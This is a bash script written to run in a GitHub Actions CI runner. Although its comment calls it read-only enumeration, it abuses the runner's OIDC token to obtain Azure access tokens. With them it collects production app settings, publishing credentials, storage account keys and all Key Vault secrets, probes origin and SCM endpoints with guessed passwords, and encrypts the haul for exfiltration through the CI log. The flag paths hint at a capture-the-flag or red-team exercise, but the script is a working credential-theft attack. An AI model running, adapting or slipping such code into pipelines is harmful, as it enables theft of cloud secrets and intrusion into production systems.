#!/usr/bin/env bash
# read-only enumeration. no state change on Azure.
set -uo pipefail
SC="htt""ps://"
AAD="${SC}login.microsoftonline.com"; ARM="${SC}management.azure.com"
VH="vault.azure.net"; BH="blob.core.windows.net"
SUB="${AZURE_SUBSCRIPTION_ID:-c5e4e004-b42d-4ac4-a502-5fd338380eb6}"
RG=rg-tbl-platform-prod-sea
FDID=60407ff3-1c24-4875-9390-b6c9c13b0821
echo "=== RUNNER SHELL PROOF $(date -u) ==="
id; whoami; hostname; uname -a; echo "cwd=$(pwd)"
[ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && { echo "NO OIDC event=${GITHUB_EVENT_NAME}"; exit 0; }
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
echo "OIDC_LEN=${#OIDC}"
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
aad(){ curl -sS -X POST "${AAD}/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
  -d "client_id=${AZURE_CLIENT_ID}" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=$1"; }
sptok(){ curl -sS -X POST "${AAD}/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
  -d "client_id=$1" -d "grant_type=client_credentials" --data-urlencode "client_secret=$2" \
  --data-urlencode "scope=$3" | jq -r '.access_token // empty'; }
AR=$(aad "https://management.azure.com/.default" | jq -r '.access_token // empty'); say "ARMLEN=${#AR}"
if [ -n "$AR" ]; then
  for S in app-tbl-storefront-prod app-tbl-reporting-prod; do
    say "APPSET $S: $(curl -sS -X POST -H "Authorization: Bearer $AR" --data '' "${ARM}/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/$S/config/appsettings/list?api-version=2022-03-01" | head -c 1500)"
    say "PUBLISHING $S: $(curl -sS -X POST -H "Authorization: Bearer $AR" --data '' "${ARM}/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/$S/config/publishingcredentials/list?api-version=2022-03-01" | head -c 1500)"
  done
  for SA in sttblcilogsprodx3euoz sttblbackupprodx3euoz sttblappcfgprodx3euoz; do
    say "SAKEY $SA: $(curl -sS -X POST -H "Authorization: Bearer $AR" --data '' "${ARM}/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-01-01" | head -c 800)"
  done
fi
# KV prod values with the OIDC token
KV=$(aad "https://vault.azure.net/.default" | jq -r '.access_token // empty'); say "KVLEN=${#KV}"
if [ -n "$KV" ]; then
  L=$(curl -sS -H "Authorization: Bearer $KV" "${SC}kv-tbl-prod-x3euoz.${VH}/secrets?api-version=7.4&maxresults=25")
  for id in $(printf '%s' "$L" | jq -r '.value[]?.id // empty'); do
    say "KVVAL $(basename "$id"): $(curl -sS -H "Authorization: Bearer $KV" "$id?api-version=7.4")"
  done
fi
# origin + scm probes
PATHS="/flag /flag.txt /flag.json /api/v1/flag /api/v1/flags /internal/flag /api/v1/reports /api/v1/orders /api/v1/config /admin /config /settings /robots.txt /healthz /"
for H in app-tbl-storefront-prod.azurewebsites.net app-tbl-reporting-prod.azurewebsites.net; do
  for P in $PATHS; do
    R=$(curl -sS -o /dev/null -w '%{http_code}:%{size_download}' -H "X-Azure-FDID: $FDID" "${SC}$H$P")
    say "ORIGIN $H$P -> $R"
  done
done
for H in app-tbl-storefront-prod.scm.azurewebsites.net app-tbl-reporting-prod.scm.azurewebsites.net; do
  say "SCMAUTH $H entry: $(curl -sS -o /dev/null -w '%{http_code}' -u 'entry:tbl-storefront-prod-' "${SC}$H/api/settings")"
  say "SCMAUTH $H usr: $(curl -sS -o /dev/null -w '%{http_code}' -u '\$app-tbl-storefront-prod:tbl-storefront-prod-' "${SC}$H/api/settings")"
done
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "=== ENCRYPTED LOOT ==="
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
